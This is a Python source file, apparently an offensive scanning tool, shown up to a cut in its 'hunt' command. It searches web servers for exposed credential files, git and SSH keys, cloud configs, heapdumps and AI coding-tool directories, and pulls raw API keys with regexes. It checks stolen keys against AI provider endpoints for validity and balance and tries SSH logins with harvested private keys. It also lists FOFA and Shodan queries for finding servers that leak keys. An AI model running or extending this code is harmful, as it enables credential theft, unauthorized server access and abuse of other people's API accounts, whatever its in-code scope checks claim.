#!/usr/bin/env python3
"""敏感目录 / 日志 / AI 工具目录泄露（授权内）。

对齐 Playbook：传承/搜魂蛊.md
Skill：杀招/搜魂蛊

子命令:
  doctor         本地自检（不打网）
  dump           浅扫固定 PATHS（旧行为）
  hunt           指纹 href → 17 类 + AI 目录；默认 SSH whoami
  space-queries  打印带授权域的 FOFA/Shodan 语法（禁止无域全网扫）

SSH：hunt 默认开，仅 in_scope host，只读 whoami。--no-ssh 关。
余额：必须 --verify-balance（先问）。只打 /models 或官方额度 GET，不发 chat。
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-dir-dump"
PLAYBOOK = "传承/搜魂蛊.md"

PATHS = (
    "/.env", "/.git/HEAD", "/.git/config", "/web.config", "/phpinfo.php",
    "/server-status", "/backup/", "/backups/", "/logs/", "/log/",
    "/data/", "/download/", "/files/", "/upload/", "/uploads/",
    "/temp/", "/tmp/", "/debug/", "/storage/logs/",
    "/storage/logs/laravel.log", "/runtime/logs/",
    "/wp-content/debug.log", "/error.log", "/access.log", "/app.log",
    "/composer.json", "/package.json", "/WEB-INF/web.xml",
)
LIST_NEEDLES = ("index of /", "directory listing for", "<title>index of")
WEAK_TAGS = frozenset({
    "JS", "LOG", "BAK", "SQLFILE", "DBFILE", "CFGJSON", "CFGYAML",
})
ENV_KW_SUBSTR = (
    "KEY", "TOKEN", "SECRET", "PASSWORD", "PASSWD", "DATABASE", "REDIS",
    "AWS", "PRIVATE", "PEM", "CREDENTIAL", "SALT", "HASH",
    "DSN", "ENDPOINT", "HUGGINGFACE", "REPLICATE", "FIREWORKS",
    "MISTRAL", "KUBERNETES", "TERRAFORM", "VAULT", "OPENAI",
    "ANTHROPIC", "DEEPSEEK", "WEBHOOK", "SMTP",
)
ENV_KW_SUFFIX = ("_SK", "_AK", "_URI", "_URL", "_HOST", "_K8S")
SECRET_RE = re.compile(
    r"(password|passwd|secret|mysql|mongodb|redis|aws_secret|begin rsa|jdbc:|"
    r"DATABASE_URL|merchant_pem|merchant_key|epay.?key)['\"]?\s*[=:>]",
    re.I,
)
STACK_JSON = ("/composer.json", "/package.json")
HREF_RE = re.compile(r"""href\s*=\s*["']([^"'#]+)["']""", re.I)
ENV_LINE_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]{1,80})\s*=\s*(.+)$", re.M)
PRIVKEY_RE = re.compile(
    r"-----BEGIN (?:RSA |OPENSSH |EC |DSA |ED25519 )?PRIVATE KEY-----",
)
GIT_BASIC_RE = re.compile(r"https?://([^/\s:@]+):([^/\s@]+)@", re.I)
DOCKER_AUTH_RE = re.compile(r'"auth"\s*:\s*"([A-Za-z0-9+/=]{8,})"')
AWS_AK_RE = re.compile(r"aws_access_key_id\s*=\s*(\S+)", re.I)
AWS_SK_RE = re.compile(r"aws_secret_access_key\s*=\s*(\S+)", re.I)
K8S_TOKEN_RE = re.compile(r"(?m)^\s*token:\s*(\S+)")
TF_SENSITIVE = frozenset({"sensitive", "<sensitive>", ""})
SSH_USERS = (
    "root", "ubuntu", "admin", "www-data", "debian", "ec2-user",
    "centos", "git", "deploy",
)

# v5 Step1 第一梯队：tool|body（含备用目录名）
AI_TOOLS_V5: tuple[tuple[str, str], ...] = (
    ("hermes", ".hermes"), ("claude", ".claude"), ("codex", ".codex"),
    ("gemini", ".gemini"), ("openclaw", ".openclaw"), ("openclaw2", "openclaw"),
    ("cursor", ".cursor"), ("windsurf", ".windsurf"), ("trae", ".trae"),
    ("augment", ".augment"), ("cline", ".cline"),
    ("roocode", ".roo-code"), ("roocode2", ".roocode"),
    ("copilot", ".github-copilot"), ("copilot2", ".copilot"),
    ("continue", ".continue"), ("aider", ".aider"), ("cody", ".cody"),
    ("lovable", ".lovable"), ("bolt", ".bolt"), ("replit", ".replit"),
    ("v0", ".v0"), ("pearai", ".pearai"), ("tabnine", ".tabnine"),
    ("supermaven", ".supermaven"), ("supermaven2", ".supermaven-api"),
    ("codeium", ".codeium"), ("sourcegraph", ".sourcegraph"),
    ("cody_sourcegraph", ".sourcegraph-cody"),
    ("ollama", ".ollama"), ("lmstudio", ".lm-studio"), ("lmstudio2", ".lmstudio"),
    ("gpt4all", ".gpt4all"), ("jan", ".jan"),
    ("text-generation-webui", ".text-generation-webui"),
    ("koboldcpp", ".koboldcpp"),
    ("mcp", ".mcp"), ("fastmcp", ".fastmcp"),
    ("crewai", ".crewai"), ("autogen", ".autogen"),
    ("langflow", ".langflow"), ("dify", ".dify"),
    ("flowise", ".flowise"), ("n8n", ".n8n"),
    ("genspark", ".genspark"), ("poe", ".poe"), ("perplexity", ".perplexity"),
    ("you", ".you"), ("phind", ".phind"),
)

# v5 Step1 额外 FOFA 语法（space-queries 再 AND domain=）
FOFA_EXTRA_SYNTAX: tuple[str, ...] = (
    'title="Index of /"',
    'title="Directory listing for /"',
    'header="Apache/2.4" && body=".env"',
    'header="nginx" && body=".claude"',
    'body="api_key" && body="parent directory"',
    'body="OPENAI_API_KEY" && body="parent directory"',
    'body="ANTHROPIC_API_KEY" && body="parent directory"',
    'body="DEEPSEEK_API_KEY" && body="parent directory"',
    'body="sk-" && body="parent directory" && after="2025-01-01"',
    'body="sk-ant-" && body="parent directory"',
    # v6 韩立猎杀者：堆转 / Actuator / 配置中心（space-hunt 仍 AND domain=）
    'title="Directory listing for /" && body="heapdump"',
    'body="heapdump" && body="parent directory"',
    'body="/actuator/heapdump"',
    'body="/actuator/env"',
    'body="Spring Boot Actuator"',
    'title="Nacos" || body="nacos/v1/cs/configs"',
    'body="/nacos/v1/auth/users"',
    'body="minio" && body="MINIO_ROOT_USER"',
    'title="Dashboard [Jenkins]" || body="Jenkins-Version"',
    'body="GitLab" && body="secrets.yml"',
    'body="metabase" && body="setup-token"',
    'port="2375" && body="Docker"',
    'port="10250" && body="Unauthorized"',
    'title="Ray Dashboard" || port="8265"',
    'body="consul" && body="v1/kv"',
    'title="Apollo" || body="apollo-configservice"',
)

# v5 第二梯队：凭证文件名
CFG_PATTERNS_V5: tuple[str, ...] = (
    ".env", ".env.local", ".env.production", ".env.development",
    ".env.backup", ".env.old", ".env.save", ".env.bak", ".env.swp",
    ".git-credentials", ".gitconfig",
    ".docker/config.json", ".dockercfg",
    "credentials.json", "credentials.yml", "credentials.yaml",
    "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
    ".npmrc", ".pypirc", ".gemrc", ".cargo/credentials",
    ".aws/credentials", ".aws/config",
    ".gcloud/application_default_credentials.json",
    ".azure/accessTokens.json",
    ".kube/config",
    "terraform.tfstate", "terraform.tfvars",
    ".pulumi/credentials.json",
    "composer.auth.json",
    "secrets.yml", "secrets.yaml", "secret.yaml",
    "serviceAccountKey.json",
    "wp-config.php", ".htpasswd",
    "settings.py", "settings.local.py",
    "application.properties", "application.yml",
    "appsettings.json", "appsettings.Development.json",
    "master.key", "credentials.yml.enc",
)

# v5 第三梯队：框架/平台（开放目录 body）
FW_PATTERNS_V5: tuple[str, ...] = (
    "Laravel", "Django", "Rails", "Spring Boot", "Express",
    "phpinfo()", "swagger", "openapi", "graphql",
    "phpMyAdmin", "adminer", "pgAdmin",
    "Jenkins", "GitLab", "Gitea", "Drone",
    "Prometheus", "Grafana", "Kibana", "Elasticsearch",
    "MinIO", "RabbitMQ", "Redis", "MongoDB",
    "phpRedisAdmin", "phpMemcachedAdmin",
)

SHODAN_EXTRA: tuple[str, ...] = (
    'http.title:"Directory listing for /" http.html:".claude"',
    'http.title:"Directory listing for /" http.html:".env"',
    'http.title:"Index of /" http.html:"api_key"',
    'http.html:"OPENAI_API_KEY"',
    'http.html:"sk-ant-"',
    'http.title:"Directory listing for /" http.html:"heapdump"',
    'http.html:"/actuator/heapdump"',
    'http.html:"/actuator/env"',
    'http.html:"nacos/v1"',
)

CENSYS_BODIES: tuple[str, ...] = (
    ".claude", ".env", "sk-", "sk-ant-", "OPENAI_API_KEY",
    "heapdump", "/actuator/heapdump",
)
LIST_PREFIXES = (
    "/", "/backup/", "/backups/", "/files/", "/download/", "/data/",
    "/tmp/", "/temp/", "/debug/", "/public/", "/static/", "/uploads/",
    "/home/", "/root/",
)

# href 标签 → 相对路径短名单（有标签才拉）
TAG_PATHS: dict[str, tuple[str, ...]] = {
    "DOTENV": (
        ".env", ".env.local", ".env.production", ".env.development",
        ".env.bak", ".env.old", ".env.save", ".env.backup", ".env.swp",
    ),
    "GITDIR": (".git/HEAD", ".git/config", ".git-credentials", ".gitconfig"),
    "SSHDIR": (
        ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa",
        ".ssh/id_dsa", ".ssh/authorized_keys", "id_rsa", "id_ed25519",
    ),
    "DOCKERDIR": (".docker/config.json", ".dockercfg"),
    "AWSDIR": (".aws/credentials", ".aws/config"),
    "GCLOUD": (
        ".gcloud/application_default_credentials.json",
        "application_default_credentials.json", "serviceAccountKey.json",
    ),
    "AZURE": (".azure/accessTokens.json", ".azure/azureProfile.json", ".azure/clouds.config"),
    "ALICLOUD": (".aliyun/config.json", ".aliyun/credentials", "aliyun-config.json"),
    "TENCENTCLOUD": (".tencentcloud/credentials", ".tccli/default.credential"),
    "HUAWEICLOUD": (".hcloud/config.json", ".huaweicloud/credentials"),
    "KUBEDIR": (".kube/config", "secrets.yml", "secret.yaml", "secrets.yaml"),
    "TERRAFORM": (
        "terraform.tfstate", ".terraform/terraform.tfstate", "terraform.tfvars",
        ".pulumi/credentials.json",
    ),
    "GITHUBDIR": (".github/workflows/ci.yml", ".github/workflows/deploy.yml"),
    "GITLABCI": (".gitlab-ci.yml",),
    "JENKINS": ("Jenkinsfile",),
    "NPMRC": (".npmrc", ".pypirc", ".gemrc", ".cargo/credentials", "composer.auth.json"),
    "CFGJSON": ("config.json", "credentials.json", "appsettings.json", "appsettings.Development.json"),
    "CFGYAML": ("config.yaml", "config.yml", "credentials.yml", "secrets.yml", "application.yml"),
    "DCCOMPOSE": ("docker-compose.yml", "docker-compose.yaml"),
    "WPCONFIG": ("wp-config.php",),
    "SETTINGSPY": ("settings.py", "settings.local.py"),
    "APPPROP": ("application.properties", "application.yml"),
    "HTPASSWD": (".htpasswd", "master.key", "credentials.yml.enc"),
    "SLACK": (".slack", "slack.json", "slack-config.json"),
    "SQLFILE": ("dump.sql", "backup.sql", "db.sql"),
    "DBFILE": ("db.sqlite3", "database.sqlite", "app.db", "data.db"),
    "SQLITEFILE": ("db.sqlite3", "database.sqlite", "app.sqlite"),
    "LOG": (
        "error.log", "access.log", "app.log", "debug.log",
        "storage/logs/laravel.log", "runtime/logs/app.log",
    ),
    "BAK": (
        ".env.bak", ".env.old", ".env.save", ".env.backup", ".env.swp",
        "config.json.bak", "config.yaml.bak", "config.json.old",
    ),
    "HEAPDUMP": (
        "heapdump", "heapdump.hprof", "dump.hprof", "actuator/heapdump",
    ),
    "ACTUATOR": ("actuator/env", "actuator/heapdump", "actuator/health"),
    "NACOS": ("nacos/v1/cs/configs", "nacos/index.html"),
    "MINIO": ("minio/login",),
    "METABASE": ("api/session/properties",),
}

# 与 v5 AI_TOOLS 同表（hunt 指纹 + space-queries body）
AI_DIRS = AI_TOOLS_V5
AI_FILES = (
    "settings.json", "credentials.json", ".credentials.json", "auth.json",
    "config.json", "config.toml", "config.yml", ".env", "mcp.json",
    "claude.json",
)
# v5 extract_tool_keys 分工具文件；未列出的走 AI_FILES
AI_FILES_BY_TOOL: dict[str, tuple[str, ...]] = {
    "hermes": ("auth.json", "config.json", ".env"),
    "claude": (".credentials.json", "settings.json", ".env", "config.json"),
    "codex": ("config.toml", ".env", "auth.json"),
    "gemini": ("credentials.json", ".env"),
    "openclaw": ("config.json", "auth.json", ".env"),
    "cursor": ("settings.json", "auth.json"),
    "windsurf": ("settings.json", "auth.json"),
    "trae": ("settings.json", "auth.json"),
    "augment": ("settings.json",),
    "cline": ("config.json", ".env"),
    "roocode": ("config.json",),
    "copilot": ("config.json",),
    "continue": ("config.json",),
    "aider": ("config.yml", ".env"),
    "cody": ("config.json",),
    "n8n": ("config.json", ".env"),
    "dify": ("config.json", ".env"),
    "flowise": ("config.json", ".env"),
    "langflow": ("config.json", ".env"),
    "ollama": ("config.json", ".env"),
    "lmstudio": ("config.json", ".env"),
}
GH_SECRET_RE = re.compile(r"(?i)(secrets|secret|vars|env)\.([A-Z][A-Z0-9_]{2,})")
COMPOSE_ENV_RE = re.compile(
    r"(?i)(?:MYSQL|POSTGRES|MONGO|REDIS|DATABASE|DB)[_A-Z]*PASSWORD['\"]?\s*[:=]\s*['\"]?(\S+)",
)

# 长前缀先匹配
KEY_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"sk-ant-[A-Za-z0-9_-]{20,}"), "anthropic"),
    (re.compile(r"sk-or-[A-Za-z0-9_-]{20,}"), "openrouter"),
    (re.compile(r"sk_live_[A-Za-z0-9]{20,}"), "stripe"),
    (re.compile(r"github_pat_[A-Za-z0-9_]{20,}"), "github_pat"),
    (re.compile(r"deepseek-[A-Za-z0-9_-]{20,}"), "deepseek"),
    (re.compile(r"sk-[A-Za-z0-9_-]{20,}"), "openai"),
    (re.compile(r"gsk-[A-Za-z0-9_-]{20,}"), "genspark"),
    (re.compile(r"AIza[0-9A-Za-z_-]{35}"), "google"),
    (re.compile(r"ghp_[A-Za-z0-9]{36}"), "github"),
    (re.compile(r"gho_[A-Za-z0-9]{36}"), "github_oauth"),
    (re.compile(r"glpat-[A-Za-z0-9_-]{20,}"), "gitlab"),
    (re.compile(r"AKIA[0-9A-Z]{16}"), "aws"),
    (re.compile(r"xox[bprs]-[A-Za-z0-9-]{10,}"), "slack"),
    (re.compile(r"hf_[A-Za-z0-9]{20,}"), "huggingface"),
    (re.compile(r"r8_[A-Za-z0-9]{20,}"), "replicate"),
    (re.compile(r"xai-[A-Za-z0-9_-]{20,}"), "xai"),
    (re.compile(r"groq_[A-Za-z0-9]{20,}"), "groq"),
    (re.compile(r"together_[A-Za-z0-9_-]{20,}"), "together"),
    (re.compile(r"fireworks_[A-Za-z0-9_-]{20,}"), "fireworks"),
    (re.compile(r"cohere_[A-Za-z0-9_-]{20,}"), "cohere"),
    (re.compile(r"jina_[A-Za-z0-9]{20,}"), "jina"),
    (re.compile(r"mistral-[A-Za-z0-9_-]{20,}"), "mistral"),
    (re.compile(r"zhipu_[A-Za-z0-9_-]{16,}"), "zhipu"),
    (re.compile(r"qwen-[A-Za-z0-9_-]{16,}"), "qwen"),
    (re.compile(r"glms-[A-Za-z0-9_-]{16,}"), "zhipu"),
    (re.compile(r"rk_live_[A-Za-z0-9]{20,}"), "stripe"),
    (re.compile(r"acct_[A-Za-z0-9]{20,}"), "twilio"),
    (re.compile(r"SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"), "sendgrid"),
    (re.compile(r"https://discord\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"), "discord"),
    (re.compile(r"https://hooks\.slack\.com/services/[A-Za-z0-9/_-]+"), "slack_hook"),
    (re.compile(r"\b(\d{8,12}:[A-Za-z0-9_-]{35})\b"), "telegram"),
)
HREF_TAG_NEEDLES: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("DOTENV", (".env", ".env.local", ".env.production", ".env.backup")),
    ("GITDIR", (".git/", ".git-credentials", ".gitconfig")),
    ("SSHDIR", (".ssh/", "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa")),
    ("DOCKERDIR", (".docker/", ".dockercfg")),
    ("AWSDIR", (".aws/",)),
    ("GCLOUD", (".gcloud/", "serviceaccount", "serviceaccountkey")),
    ("AZURE", (".azure/",)),
    ("ALICLOUD", (".aliyun/",)),
    ("TENCENTCLOUD", (".tencentcloud/", ".tccli/")),
    ("HUAWEICLOUD", (".hcloud/", ".huaweicloud/")),
    ("KUBEDIR", (".kube/",)),
    ("TERRAFORM", ("terraform.tfstate", ".terraform/", "tfvars", ".pulumi/")),
    ("GITHUBDIR", (".github/",)),
    ("GITLABCI", (".gitlab-ci",)),
    ("JENKINS", ("jenkinsfile", "jenkins")),
    ("NPMRC", (".npmrc", ".pypirc", ".gemrc", ".cargo/", "composer.auth")),
    ("CFGJSON", ("config.json", "credentials.json", "appsettings.json")),
    ("CFGYAML", ("config.yaml", "config.yml", "credentials.yml", "secrets.yml")),
    ("DCCOMPOSE", ("docker-compose.yml", "docker-compose.yaml")),
    ("WPCONFIG", ("wp-config.php",)),
    ("SETTINGSPY", ("settings.py", "settings.local.py")),
    ("APPPROP", ("application.properties", "application.yml")),
    ("HTPASSWD", (".htpasswd", "master.key", "credentials.yml.enc")),
    ("SLACK", (".slack", "slack.json", "slack-config.json")),
    ("SQLFILE", (".sql",)),
    ("DBFILE", (".db",)),
    ("SQLITEFILE", (".sqlite", ".sqlite3")),
    ("LOG", (".log",)),
    ("BAK", (".bak", ".old", ".swp", ".save", ".backup", ".orig")),
    ("JS", (".js",)),
    ("HEAPDUMP", ("heapdump", ".hprof", "dump.hprof")),
    ("ACTUATOR", ("/actuator/", "actuator/env", "actuator/heapdump")),
    ("NACOS", ("nacos/", "nacos/v1")),
    ("MINIO", ("minio", "minio_root")),
    ("SHIRO", ("shiro", "rememberme")),
    ("METABASE", ("metabase", "setup-token")),
)


def redact(val: str) -> str:
    s = (val or "").strip()
    if len(s) <= 10:
        return s[:2] + "****"
    return s[:8] + "****" + s[-4:]


def _require_scope(base: str) -> str:
    host = host_of(base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or base}", file=sys.stderr)
        sys.exit(2)
    return host


def _sess() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = UA
    return s


def _get(sess: requests.Session, url: str, timeout: int = 10) -> dict[str, Any]:
    try:
        r = sess.get(url, timeout=timeout, verify=False, allow_redirects=False)
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    low = text[:4000].lower()
    htmlish = ("text/html" in (r.headers.get("Content-Type") or "").lower()) or low.lstrip().startswith(
        ("<!doctype", "<html", "<head")
    )
    listing = any(n in low for n in LIST_NEEDLES)
    secret = (not htmlish) and r.status_code in {200, 206} and bool(SECRET_RE.search(text[:8000]))
    git = (not htmlish) and (text.startswith("ref: ") or text.lstrip().startswith("[core]"))
    return {
        "url": url,
        "status": r.status_code,
        "size": len(text),
        "listing": listing,
        "secret": secret,
        "git": git,
        "htmlish": htmlish,
        "text": text,
        "snip": re.sub(r"\s+", " ", text)[:140],
    }


def _classify_keys(text: str) -> list[dict[str, str]]:
    found: list[dict[str, str]] = []
    seen: set[str] = set()
    for pat, kind in KEY_PATTERNS:
        for m in pat.finditer(text or ""):
            val = m.group(1) if m.lastindex else m.group(0)
            if val in seen or len(val) < 8:
                continue
            seen.add(val)
            found.append({"kind": kind, "redact": redact(val), "raw": val})
    return found


def _env_name_hit(name: str) -> bool:
    u = (name or "").upper()
    if any(k in u for k in ENV_KW_SUBSTR):
        return True
    return any(u.endswith(suf) for suf in ENV_KW_SUFFIX)


def _env_hits(text: str) -> list[dict[str, str]]:
    hits: list[dict[str, str]] = []
    for m in ENV_LINE_RE.finditer(text or ""):
        name, val = m.group(1), m.group(2).strip().strip("'\"")
        if not _env_name_hit(name):
            continue
        if len(val) < 4 or val.lower() in {"null", "none", "true", "false", "0", "1"}:
            continue
        row = {"name": name, "redact": redact(val), "raw": val}
        keys = _classify_keys(val)
        if keys:
            row["kind"] = keys[0]["kind"]
        hits.append(row)
    return hits


def _raw_dir(case: str) -> Path | None:
    if not case:
        return None
    d = ENGINE / "案卷" / case / "测绘" / "dir_dump" / "raw"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _save_raw(case: str, name: str, text: str, mode: int = 0o600) -> str:
    d = _raw_dir(case)
    if d is None:
        return ""
    safe = re.sub(r"[^A-Za-z0-9._-]+", "_", name)[:80]
    p = d / safe
    p.write_text(text, encoding="utf-8", errors="replace")
    os.chmod(p, mode)
    return str(p)


def _href_has_dir(hrefs: list[str], dirname: str) -> bool:
    d = dirname.lower().strip("/")
    if not d:
        return False
    for h in hrefs:
        p = h.lower().split("?", 1)[0].rstrip("/")
        base = p.rsplit("/", 1)[-1]
        if base == d or p.endswith("/" + d) or p == d:
            return True
    return False


def _fingerprint(html: str) -> set[str]:
    tags: set[str] = set()
    hrefs = [h.lower() for h in HREF_RE.findall(html or "")]
    blob = " ".join(hrefs)
    for tag, needles in HREF_TAG_NEEDLES:
        if any(n in blob for n in needles):
            tags.add(tag)
    for name, dirname in AI_DIRS:
        if _href_has_dir(hrefs, dirname):
            tags.add("AI:" + name)
    return tags


def _listing_hrefs(html: str) -> list[str]:
    out: list[str] = []
    for h in HREF_RE.findall(html or ""):
        if h.startswith("?") or h in {".", "..", "../", "./"}:
            continue
        out.append(h)
    return out


def _dump_get_row(sess: requests.Session, url: str) -> dict[str, Any]:
    row = _get(sess, url)
    row.pop("text", None)
    return row


def cmd_dump(args: argparse.Namespace) -> dict[str, Any]:
    _require_scope(args.base)
    base = args.base.rstrip("/")
    sess = _sess()
    findings: list[dict[str, Any]] = []
    for p in PATHS:
        row = _dump_get_row(sess, urljoin(base + "/", p.lstrip("/")))
        if row.get("error") or row.get("status") not in {200, 206}:
            continue
        if row.get("secret") or row.get("git"):
            row.update({"level": "L2", "signal": "secret-or-git", "path": p})
            findings.append(row)
            print(f"  L2 secret {p}")
            if len([f for f in findings if f.get("level") == "L2"]) >= 4:
                break
            continue
        if p in STACK_JSON and not row.get("htmlish") and (
            '"require"' in (row.get("snip") or "") or '"name"' in (row.get("snip") or "")
        ):
            row.update({"level": "L1", "signal": "stack-manifest", "path": p})
            findings.append(row)
            print(f"  L1 stack {p}")
            continue
        if row.get("listing") and row.get("status") == 200:
            row.update({"level": "L1", "signal": "dir-list", "path": p})
            findings.append(row)
            print(f"  L1 listing {p}")
    level = "L2" if any(f.get("level") == "L2" for f in findings) else (
        "L1" if findings else "none"
    )
    report = {
        "target": base,
        "ts": datetime.now(UTC).isoformat(),
        "level": level,
        "cmd": "dump",
        "findings": findings,
        "playbook": PLAYBOOK,
        "next": "L2=目录或文件含口令/连接串。深挖用 hunt；禁止把全文抄进可同步文档。",
    }
    out_path = write_probe_json(
        report, case=args.case, out=args.out, case_subdir="dir_dump", filename="surface.json",
    )
    print(json.dumps({"level": level, "findings": len(findings), "out": str(out_path)}, ensure_ascii=False))
    return report


def _ssh_whoami(key_path: Path, host: str) -> dict[str, Any]:
    if not shutil.which("ssh"):
        return {"ok": False, "error": "no-ssh-binary"}
    if not in_scope(host):
        return {"ok": False, "error": "host-out-of-scope", "host": host}
    last = ""
    for user in SSH_USERS:
        cmd = [
            "ssh", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
            "-o", "IdentitiesOnly=yes", "-o", "ConnectTimeout=8",
            "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
            "-i", str(key_path), f"{user}@{host}", "whoami",
        ]
        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
        except Exception as e:
            last = str(e)[:80]
            continue
        out = (p.stdout or "").strip()
        if p.returncode == 0 and out and "\n" not in out and len(out) < 40:
            print(f"  L2 ssh {user}@{host} whoami={out}")
            return {"ok": True, "user": user, "host": host, "whoami": out[:40]}
        err = (p.stderr or "")[:80]
        if err:
            last = err
    return {"ok": False, "host": host, "error": last or "auth-fail"}


def _verify_one(kind: str, key: str) -> dict[str, Any]:
    """只打 /models 或官方额度 GET，不发 chat。"""
    headers_oa = {"Authorization": f"Bearer {key}", "User-Agent": UA}
    routes: dict[str, list[tuple[str, str, dict[str, str]]]] = {
        "openai": [
            ("models", "https://api.openai.com/v1/models", headers_oa),
            ("balance", "https://api.openai.com/v1/dashboard/billing/credit_grants", headers_oa),
        ],
        "anthropic": [
            ("models", "https://api.anthropic.com/v1/models", {
                "x-api-key": key, "anthropic-version": "2023-06-01", "User-Agent": UA,
            }),
        ],
        "deepseek": [
            ("models", "https://api.deepseek.com/v1/models", headers_oa),
            ("balance", "https://api.deepseek.com/user/balance", headers_oa),
        ],
        "openrouter": [
            ("balance", "https://openrouter.ai/api/v1/auth/key", headers_oa),
        ],
        "xai": [
            ("models", "https://api.x.ai/v1/models", headers_oa),
        ],
        "huggingface": [
            ("models", "https://huggingface.co/api/whoami-v2", headers_oa),
        ],
        "moonshot": [
            ("models", "https://api.moonshot.cn/v1/models", headers_oa),
        ],
        "zhipu": [
            ("models", "https://open.bigmodel.cn/api/paas/v4/models", headers_oa),
        ],
        "qwen": [
            ("models", "https://dashscope.aliyuncs.com/compatible-mode/v1/models", headers_oa),
        ],
        "groq": [
            ("models", "https://api.groq.com/openai/v1/models", headers_oa),
        ],
        "together": [
            ("models", "https://api.together.xyz/v1/models", headers_oa),
        ],
        "fireworks": [
            ("models", "https://api.fireworks.ai/inference/v1/models", headers_oa),
        ],
        "cohere": [
            ("models", "https://api.cohere.com/v1/models", headers_oa),
        ],
        "mistral": [
            ("models", "https://api.mistral.ai/v1/models", headers_oa),
        ],
        "replicate": [
            ("balance", "https://api.replicate.com/v1/account", headers_oa),
        ],
        "jina": [
            ("models", "https://api.jina.ai/v1/models", headers_oa),
        ],
        "genspark": [
            ("models", "https://api.openai.com/v1/models", headers_oa),
        ],
    }
    plan = routes.get(kind)
    if not plan:
        return {"kind": kind, "redact": redact(key), "status": "no-route"}
    out: dict[str, Any] = {"kind": kind, "redact": redact(key), "probes": []}
    ok = False
    for name, url, hdrs in plan:
        try:
            r = requests.get(url, headers=hdrs, timeout=12, verify=True)
            body = (r.text or "")[:400]
            row: dict[str, Any] = {"name": name, "http": r.status_code}
            if r.status_code == 200:
                looks_json = body.lstrip().startswith(("{", "["))
                useful = looks_json and any(
                    k in body.lower()
                    for k in ("data", "object", "model", "balance", "total_granted",
                              "limit", "usage", "credits", "name")
                )
                if useful:
                    ok = True
                    row["signal"] = "balance" if any(
                        k in body.lower()
                        for k in ("balance", "total_granted", "credits", "usage")
                    ) else "models-or-object"
                    row["snip"] = re.sub(r"\s+", " ", body)[:120]
                else:
                    row["signal"] = "http200-not-json"
            elif r.status_code in {401, 403}:
                row["signal"] = "invalid"
            else:
                row["signal"] = "other"
            out["probes"].append(row)
        except Exception as e:
            out["probes"].append({"name": name, "error": str(e)[:80]})
    out["ok"] = ok
    out["level"] = "L3" if ok else "none"
    return out


def _fetch_interesting(
    sess: requests.Session,
    listing_url: str,
    tags: set[str],
    deep: bool,
    hrefs: list[str],
) -> list[dict[str, Any]]:
    paths: list[str] = []
    for tag, plist in TAG_PATHS.items():
        if tag in tags:
            paths.extend(plist)
    for tag in tags:
        if tag.startswith("AI:"):
            name = tag.split(":", 1)[1]
            dirname = dict(AI_DIRS).get(name, "." + name)
            base = name.rstrip("0123456789")
            if base.endswith("_sourcegraph"):
                base = "cody"
            files = AI_FILES_BY_TOOL.get(name) or AI_FILES_BY_TOOL.get(base) or AI_FILES
            for fn in files:
                paths.append(f"{dirname}/{fn}")
                paths.append(fn)
    js_hrefs = [h for h in hrefs if h.lower().split("?", 1)[0].endswith(".js")]
    if "JS" in tags or js_hrefs:
        paths.extend(js_hrefs[:15])
    if deep:
        for h in hrefs:
            low = h.lower().split("?", 1)[0]
            if any(low.endswith(ext) for ext in (
                ".env", ".json", ".toml", ".yml", ".yaml", ".log",
                ".bak", ".old", ".conf", ".properties", ".php",
                ".sql", ".sqlite", ".sqlite3", ".db",
            )) or low.rstrip("/").endswith((
                "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                "credentials", "tfstate", "config",
            )):
                paths.append(h)
    # 去重保序
    seen: set[str] = set()
    uniq: list[str] = []
    for p in paths:
        p = p.lstrip("/")
        if p in seen:
            continue
        seen.add(p)
        uniq.append(p)
    rows: list[dict[str, Any]] = []
    for p in uniq[:120]:
        url = urljoin(listing_url if listing_url.endswith("/") else listing_url + "/", p)
        row = _get(sess, url, timeout=8)
        if row.get("error") or row.get("status") not in {200, 206}:
            continue
        if row.get("htmlish") and not row.get("listing") and not PRIVKEY_RE.search(row.get("text") or ""):
            continue
        rows.append(row)
    return rows


def _hermes_follow(sess: requests.Session, listing_url: str, text: str) -> list[str]:
    """auth.json credential_pool source=env:VAR → 回根 .env。"""
    extras: list[str] = []
    try:
        data = json.loads(text)
    except Exception:
        return extras
    pool = data.get("credential_pool") if isinstance(data, dict) else None
    if not isinstance(pool, list):
        return extras
    names: list[str] = []
    for item in pool:
        if not isinstance(item, dict):
            continue
        src = str(item.get("source") or "")
        if src.startswith("env:"):
            names.append(src.split(":", 1)[1])
    if not names:
        return extras
    root = listing_url.rsplit("/", 1)[0] if not listing_url.endswith("/") else listing_url.rstrip("/")
    for envp in (".env", "../.env"):
        row = _get(sess, urljoin(root + "/", envp), timeout=8)
        if row.get("status") in {200, 206} and not row.get("htmlish"):
            extras.append(row.get("text") or "")
    return extras


def cmd_hunt(args: argparse.Namespace) -> dict[str, Any]:
    bases: list[str] = []
    if getattr(args, "base", None):
        bases.append(args.base)
    uf = getattr(args, "urls_file", None)
    if uf:
        for ln in Path(uf).read_text(encoding="utf-8", errors="replace").splitlines():
            ln = ln.strip()
            if ln and not ln.startswith("#"):
